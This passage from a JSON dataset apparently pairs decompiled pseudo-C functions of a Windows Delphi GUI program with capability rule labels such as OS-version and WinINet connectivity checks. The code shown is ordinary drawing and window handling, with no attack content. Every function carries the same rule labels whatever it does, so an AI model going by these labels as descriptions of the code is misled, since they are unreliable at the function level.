        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447604(uint arg_8h)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4476a2;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    var_8h = 0;\n    if (in_EAX != NULL) {\n        while (*in_EAX != '\\0') {\n            while (((cVar1 = *in_EAX,  cVar1 != '\\0' && (cVar1 != '\\n')) && (cVar1 != '\\r'))) {\n                in_EAX = fcn.0040e760();\n            }\n            fcn.00405620();\n            iVar2 = fcn.004254f0();\n            if (var_8h < iVar2) {\n                var_8h = iVar2;\n            }\n            if (*in_EAX == '\\r') {\n                in_EAX = in_EAX + 1;\n            }\n            if (*in_EAX == '\\n') {\n                in_EAX = in_EAX + 1;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4476a9;\n    uStack32 = 0x4476a1;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 355
    },
    "004476b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004476b4(uint param_1, uint *param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uchar uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    int32_t var_6dh;\n    int32_t var_65h;\n    char var_5dh;\n    uint lpPoint;\n    uint var_58h;\n    uint dx;\n    uint dy;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint lprc;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4ch = *param_2;\n    var_48h = param_2[1];\n    var_4h = in_EAX;\n    fcn.00405fe8();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff54;\n    *(var_4h + 0x58) = 0;\n    var_14h = 0;\n    if ((*(var_4h + 0x88) != '\\0') && (*(var_4h + 0x60) != 0)) {\n        fcn.0044821c();\n        cVar2 = fcn.0043baa4();\n        if (cVar2 != '\\0') {\n            fcn.0044ed7c();\n            iVar4 = fcn.00444978();\n            if (iVar4 == *(var_4h + 0x60)) {\n                var_44h = *(var_4h + 0x60);\n                var_3ch = var_4ch;\n                var_38h = var_48h;\n                iVar4 = fcn.0044744c();\n                var_38h = var_38h + iVar4;\n                var_34h = fcn.00443cf4();\n                var_30h = *(var_4h + 0x5c);\n                fcn.00450124();\n                (**(**(var_4h + 0x60) + 0x40))();\n                lpPoint = 0;\n                var_58h = 0;\n                piVar1 = *(*(var_4h + 0x60) + 0x30);\n                if (piVar1 == NULL) {\n                    iVar4 = *(var_4h + 0x60);\n                    cVar2 = fcn.004047dc();\n                    if ((cVar2 != '\\0') && (*(iVar4 + 0x1c4) != 0)) {\n                        sub.user32.dll_ClientToScreen();\n                    }\n                }\n                else {\n                    (**(*piVar1 + 0x40))();\n                }\n                sub.user32.dll_OffsetRect();\n                fcn.00450344();\n                fcn.00444940();\n                fcn.0044d4d4();\n                fcn.004055c8();\n                var_10h = *(var_4h + 0x74);\n                var_40h = *0x490500;\n                var_8h = 0;\n                arg_8h = &var_44h;\n                iVar4 = fcn.00451abc(arg_8h);\n                var_5dh = iVar4 == 0;\n                if ((var_5dh) && (*(var_4h + 0x15a) != 0)) {\n                    (**(var_4h + 0x158))(&var_44h);\n                }\n                if ((var_5dh == '\\0') || (*(var_4h + 0x60) == 0)) {\n                    uVar3 = 0;\n                }\n                else {\n                    uVar3 = 1;\n                }\n                *(var_4h + 0x58) = uVar3;\n                if ((*(var_4h + 0x58) != '\\0') && (var_ch != 0)) {\n                    fcn.004475a4(&stack0xfffffffc);\n                    (**(**(var_4h + 0x84) + 0x74))();\n                    (**(**(var_4h + 0x84) + 0xe8))(&var_6dh, var_8h);\n                    sub.user32.dll_OffsetRect(&var_6dh, var_3ch, var_38h);\n                    cVar2 = fcn.0040484c();\n                    if (cVar2 != '\\0') {\n                        iVar4 = fcn.00447604(&stack0xfffffffc);\n                        var_6dh = var_6dh - (iVar4 + 5);\n                        var_65h = var_65h - (iVar4 + 5);\n                    }\n                    fcn.00450294();\n                    *(var_4h + 100) = var_88h;\n                    *(var_4h + 0x68) = var_84h;\n                    fcn.00450294();\n                    *(var_4h + 0x6c) = var_88h;\n                    *(var_4h + 0x70) = var_84h;\n                    fcn.00450978();\n                    (**(**(var_4h + 0x84) + 0xe4))(var_8h);\n                    fcn.00444a8c();\n                    if (var_14h < 1) {\n                        fcn.004471dc();\n                    }\n                    else {\n                        fcn.004471dc();\n                    }\n                    goto code_r0x00447a16;\n                }\n            }\n        }\n    }\n    if (var_14h < 1) {\n        fcn.00447414();\n    }\n    else {\n        fcn.004471dc();\n    }\ncode_r0x00447a16:\n    *in_FS_OFFSET = arg_8h;\n    fcn.00405554();\n    fcn.004060ac();\n    return;\n}\n",
        "token_count": 1430
    },
    "00447a50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00447a50(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = 0;\n    while( true ) {\n        iVar1 = fcn.0040676c(param_1);\n        if (iVar1 <= iVar2) break;\n        if (param_2 == *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc)) {\n            uVar3 = *(*(in_EAX + 0xd0) + iVar2 * 0xc);\n            goto code_r0x00447b0e;\n        }\n        if (*(*(in_EAX + 0xd0) + iVar2 * 0xc) == -1) break;\n        iVar2 = iVar2 + 1;\n    }\n    uVar3 = *(in_EAX + 0xcc);\n    *(in_EAX + 0xcc) = *(in_EAX + 0xcc) + 1;\n    iVar1 = fcn.0040676c();\n    if (iVar1 <= iVar2) {\n        iVar2 = fcn.0040676c();\n        fcn.00406928(iVar2 + 1);\n    }\n    *(*(in_EAX + 0xd0) + iVar2 * 0xc) = uVar3;\n    *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc) = param_2;\n    *(*(in_EAX + 0xd0) + 8 + iVar2 * 0xc) = *(param_2 + 0x344) != 0;\ncode_r0x00447b0e:\n    return CONCAT44(uVar3, uVar3);\n}\n",
        "token_count": 401
    },
    "00447b18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00447b18(void)\n\n{\n    if ((*(*0x497c20 + 0x68) == 0) || (*(*(*0x497c20 + 0x68) + 0x284) == 0)) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00447b54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00447b54(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0xf2) != 0) {\n        (**(in_EAX + 0xf0))();\n    }\n    iVar1 = sub.user32.dll_GetActiveWindow();\n    if (iVar1 == 0) {\n        sub.user32.dll_GetLastActivePopup(*(in_EAX + 0x30));\n    }\n    return CONCAT44(iVar1, iVar1);\n}\n",
        "token_count": 115
    },
    "00447b9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00447b9c(void)\n\n{\n    int32_t in_EAX;\n    uint uStack8;\n    \n    uStack8 = 0;\n    if (*(in_EAX + 0xfa) != 0) {\n        (**(in_EAX + 0xf8))();\n    }\n    if (*(in_EAX + 0x44) != 0) {\n        uStack8 = fcn.00458568();\n    }\n    return CONCAT44(uStack8, uStack8);\n}\n",
        "token_count": 111
    },
    "00447bdc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.00447bdc(int32_t param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uStack24;\n    \n    iVar4 = *(*0x497c20 + 0x68);\n    if (iVar4 == 0) {\ncode_r0x00447c07:\n        if ((iVar4 != *(in_EAX + 0x44)) && (*(in_EAX + 0x44) != 0)) {\n            iVar4 = fcn.00451abc(param_1);\n            if (iVar4 == 1) goto code_r0x00447c27;\n        }\n        uVar1 = 0;\n    }\n    else {\n        iVar3 = fcn.00451abc(param_1);\n        if (iVar3 != 1) goto code_r0x00447c07;\ncode_r0x00447c27:\n        uVar1 = 1;\n    }\n    uStack24 = param_2 & 0xffffff00 | uVar1;\n    if (uVar1 == 0) {\n        cVar2 = fcn.004047dc();\n        if ((((cVar2 != '\\0') && (*(param_1 + 0x6a) != '\\0')) && (*(param_1 + 0x60) != '\\0')) &&\n           ((*(param_1 + 0x1c) & 0x10) == 0)) {\n            fcn.0044a824();\n        }\n    }\n    return CONCAT44(uStack24, uStack24) & 0xffffffff000000ff;\n}\n",
        "token_count": 381
    },
    "00447c74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00447c74(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xda) != 0) {\n        (**(in_EAX + 0xd8))();\n    }\n    return 0;\n}\n",
        "token_count": 58
    },
    "00447c9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00447c9c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xe2) != 0) {\n        (**(in_EAX + 0xe0))();\n    }\n    return 0;\n}\n",
        "token_count": 60
    },
    "00447e60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00447e60(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    cVar1 = fcn.0042fa90();\n    if ((cVar1 == '\\0') || (cVar1 = fcn.00458874(),  cVar1 == '\\0')) {\n        if ((*(in_EAX + 7) & 0x10) != 0) {\n            uVar3 = fcn.00458568(0, 0xffffffff);\n            sub.user32.dll_InvalidateRect(uVar3);\n        }\n    }\n    else {\n        iVar2 = fcn.00447dac();\n        if (*(iVar2 + 8) == '\\0') {\n            fcn.00403af4();\n        }\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            fcn.00458568();\n            fcn.0042f964();\n            (**(*in_EAX + 0x80))();\n        }\n        else {\n            uVar3 = fcn.00458568(0, 0xffffffff);\n            sub.user32.dll_InvalidateRect(uVar3);\n        }\n    }\n    return;\n}\n",
        "token_count": 276
    },
    "00448098": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00448098(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 8) != '\\0') {\n        cVar1 = fcn.0042fa90();\n        if ((cVar1 != '\\0') &&\n           ((((*(in_EAX + 0x28) != '\\0' || (*(in_EAX + 0xc) != 0)) || (*(in_EAX + 0x10) != 0)) ||\n            ((*(in_EAX + 0x14) != 0 || (*(in_EAX + 0x18) != 0)))))) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 158
    },
    "004480d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004480d0(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (param_2 != *(in_EAX + 2)) {\n        *(in_EAX + 2) = param_2;\n        if ((*(in_EAX + 2) != '\\0') && (*(in_EAX[1] + 0x350) != '\\0')) {\n            fcn.004434b4();\n        }\n        (**(*in_EAX + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "00448194": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00448194(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.0043b6cc();\n    if (iVar1 != 0) {\n        *0x497c2c = 0;\n        sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n        if ((*(*(in_EAX + 0x44) + 0x273) == '\\x01') && (*(*(in_EAX + 0x44) + 0x57) == '\\0')) {\n            fcn.0043fd24();\n            fcn.00442b1c();\n        }\n        fcn.00445400();\n        fcn.0044555c();\n        if (*(*0x497c20 + 100) != 0) {\n            uVar2 = fcn.00458568();\n            sub.user32.dll_SetFocus(uVar2);\n        }\n        if (*(in_EAX + 0x14a) != 0) {\n            (**(in_EAX + 0x148))();\n        }\n    }\n    return;\n}\n",
        "token_count": 253
    },
    "00448234": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00448234(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x448297;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    *0x497c24 = *0x497c24 + 1;\n    if (*0x497c24 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x497c1c != 0) {\n            iStack20 = 0x44825b;\n            fcn.0043b808();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (*0x497c34 != 0) {\n            iStack20 = *0x497c34;\n            sub.kernel32.dll_CloseHandle_1();\n        }\n        fcn.004193bc();\n        fcn.00406934();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 268
    },
    "004485a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004485a4(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x3c) != 0;\n}\n",
        "token_count": 50
    },
    "004485ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004485ac(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x3c) == 0) {\n        fcn.0044877c();\n    }\n    return;\n}\n",
        "token_count": 53
    },
    "00448744": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00448744(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    cVar1 = fcn.004485a4();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x42) == '\\0')) {\n        uVar2 = fcn.004486e0();\n        sub.comctl32.dll_ImageList_Destroy(uVar2);\n    }\n    *(in_EAX + 0x3c) = 0;\n    fcn.0040484c();\n    return;\n}\n",
        "token_count": 128
    },
    "00448a04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00448a04(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *piVar3;\n    uint in_EDX;\n    uint var_28h;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = in_EDX;\n    cVar1 = fcn.004485a4();\n    if (cVar1 != '\\0') {\n        if (arg_8h == '\\0') {\n            if (*(in_EAX + 0x54) == 0) {\n                piVar3 = fcn.0042935c();\n                *(in_EAX + 0x54) = piVar3;\n                fcn.0042a760();\n                (**(*piVar3 + 0x40))();\n                (**(*piVar3 + 0x34))();\n            }\n            fcn.00429930();\n            fcn.00424f38();\n            fcn.00418438(&var_28h, *(in_EAX + 0x30));\n            fcn.00429930(&var_28h);\n            fcn.004252dc();\n            fcn.00429930(0, 0, 0, 0, 0xffffffff, 0, 0);\n            uVar2 = fcn.00425694();\n            uVar2 = fcn.004486e0(var_4h, uVar2);\n            sub.comctl32.dll_ImageList_DrawEx(uVar2);\n            fcn.00418438(&var_18h, arg_10h + *(in_EAX + 0x30));\n            fcn.00429930();\n            var_8h = fcn.00425694();\n            fcn.00424f38();\n            uVar2 = fcn.00425694();\n            sub.gdi32.dll_SetTextColor(uVar2, 0xffffff);\n            sub.gdi32.dll_SetBkColor(uVar2, 0);\n            sub.gdi32.dll_BitBlt\n                      (uVar2, arg_14h + 1, arg_10h + 1, *(in_EAX + 0x34), *(in_EAX + 0x30), var_8h, 0, 0, 0xe20746);\n            fcn.00424f38();\n            uVar2 = fcn.00425694();\n            sub.gdi32.dll_SetTextColor(uVar2, 0xffffff);\n            sub.gdi32.dll_SetBkColor(uVar2, 0);\n            sub.gdi32.dll_BitBlt(uVar2, arg_14h, arg_10h, *(in_EAX + 0x34), *(in_EAX + 0x30), var_8h, 0, 0, 0xe20746);\n        }\n        else {\n            uVar2 = fcn.004483f4(arg_ch);\n            fcn.004489dc(uVar2);\n            uVar2 = fcn.004483f4();\n            uVar2 = fcn.00425694(arg_14h, arg_10h, 0, 0, uVar2);\n            uVar2 = fcn.004486e0(var_4h, uVar2);\n            sub.comctl32.dll_ImageList_DrawEx(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 774
    },
    "00449208": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00449208(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    if (*(*(arg_8h + -4) + 0x20) == 0) {\n        iVar2 = fcn.004488e8();\n        return 0 < iVar2;\n    }\n    cVar1 = fcn.004047dc();\n    if ((cVar1 != '\\0') && (cVar1 = fcn.00449118(),  cVar1 != '\\0')) {\n        return false;\n    }\n    return true;\n}\n",
        "token_count": 133
    },
    "004492bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004492bc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puVar3;\n    int32_t iStack112;\n    uint uStack108;\n    uchar *puStack104;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint var_30h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    puStack84 = 0x4492d9;\n    var_4h = in_EAX;\n    fcn.0041b930();\n    puStack84 = 0x4492e8;\n    fcn.0041b930();\n    puStack84 = 0x4492f4;\n    var_8h = fcn.0042935c();\n    uStack88 = 0x449540;\n    iStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    iVar1 = fcn.0041b704();\n    (**(*var_8h + 0x54))();\n    puStack104 = 0x449327;\n    fcn.0041b724(var_18h + iVar1, var_18h + iVar1 >> 0x1f);\n    puStack104 = 0x449333;\n    var_10h = fcn.0042935c();\n    uStack108 = 0x449523;\n    iStack112 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff90;\n    puStack104 = &stack0xfffffffc;\n    (**(*var_10h + 0x54))();\n    var_ch = fcn.0042935c();\n    (**(*var_ch + 0x40))();\n    (**(*var_ch + 0x34))();\n    var_14h = fcn.0042935c();\n    fcn.0042a760();\n    (**(*var_14h + 0x40))();\n    (**(*var_14h + 0x34))();\n    fcn.00418438(&fcn.004492bc::var_30h, *(var_4h + 0x30));\n    fcn.004498e8();\n    puVar3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    iVar1 = (**(*var_8h + 0x20))();\n    iVar1 = iVar1 / *(var_4h + 0x30);\n    if (-1 < iVar1 + -1) {\n        do {\n            var_20h = iVar1;\n            if (var_1ch == 0) break;\n            iVar1 = (**(*var_8h + 0x2c))();\n            iVar1 = iVar1 / *(var_4h + 0x34);\n            if (-1 < iVar1 + -1) {\n                do {\n                    if (var_1ch == 0) break;\n                    fcn.00418460(&fcn.004492bc::var_40h, *(var_4h + 0x30));\n                    puVar3 = &fcn.004492bc::var_40h;\n                    uVar2 = fcn.00429930();\n                    fcn.00429930(uVar2);\n                    fcn.004251a8(puVar3);\n                    fcn.00418460(&fcn.004492bc::var_40h, *(var_4h + 0x30));\n                    puVar3 = &fcn.004492bc::var_40h;\n                    uVar2 = fcn.00429930();\n                    fcn.00429930(uVar2);\n                    fcn.004251a8(puVar3);\n                    fcn.0044881c();\n                    var_1ch = var_1ch + -1;\n                    iVar1 = iVar1 + -1;\n                } while (iVar1 != 0);\n            }\n            var_20h = var_20h + -1;\n            iVar1 = var_20h;\n        } while (var_20h != 0);\n    }\n    *in_FS_OFFSET = puVar3;\n    fcn.00404650();\n    fcn.00404650();\n    fcn.004498ec();\n    return;\n}\n",
        "token_count": 1026
    },
    "004497a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004497a4(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    if (*0x497c50 == 0) {\n        *0x497c50 = fcn.0040e394();\n        if (0x5ffff < *0x497c50) {\n            iVar1 = sub.kernel32.dll_GetModuleHandleA_2();\n            if (iVar1 != 0) {\n                *0x497c54 = sub.kernel32.dll_GetProcAddress_1();\n            }\n        }\n    }\n    puStack40 = 0x449803;\n    iVar1 = fcn.00420a60(0);\n    uStack44 = 0x44989e;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if (*0x497c54 == NULL) {\n        if (iVar1 != 0) {\n            iVar1 = iVar1 + 0x14;\n        }\n        puStack40 = &stack0xfffffffc;\n        uVar3 = fcn.004486e0(iVar1);\n        iVar1 = sub.comctl32.dll_ImageList_Write();\n        if (iVar1 == 0) {\n            fcn.0040dba8();\n            fcn.00404ec4();\n        }\n    }\n    else {\n        if (iVar1 != 0) {\n            iVar1 = iVar1 + 0x14;\n        }\n        uVar3 = 1;\n        puStack40 = &stack0xfffffffc;\n        uVar2 = fcn.004486e0(1, iVar1);\n        iVar1 = (**0x497c54)(uVar2);\n        if (iVar1 != 0) {\n            fcn.0040dba8();\n            fcn.00404ec4();\n        }\n    }\n    *in_FS_OFFSET = uVar3;\n    uStack48 = 0x4498a5;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 472
    },
    "004498ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004498ec(void)\n\n{\n    int32_t in_EAX;\n    \n    if (0 < *(in_EAX + 0x5c)) {\n        *(in_EAX + 0x5c) = *(in_EAX + 0x5c) + -1;\n    }\n    if (*(in_EAX + 0x58) != '\\0') {\n        *(in_EAX + 0x58) = 0;\n        fcn.0040484c();\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "0044a06c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0044a06c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ff44();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x30) = uVar1;\n    iVar2 = fcn.00404620();\n    *(in_EAX + 0x34) = iVar2;\n    *(iVar2 + 0xc) = in_EAX;\n    *(iVar2 + 8) = 0x44a1f0;\n    *(in_EAX + 0x58) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 271
    },
    "0044a2e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
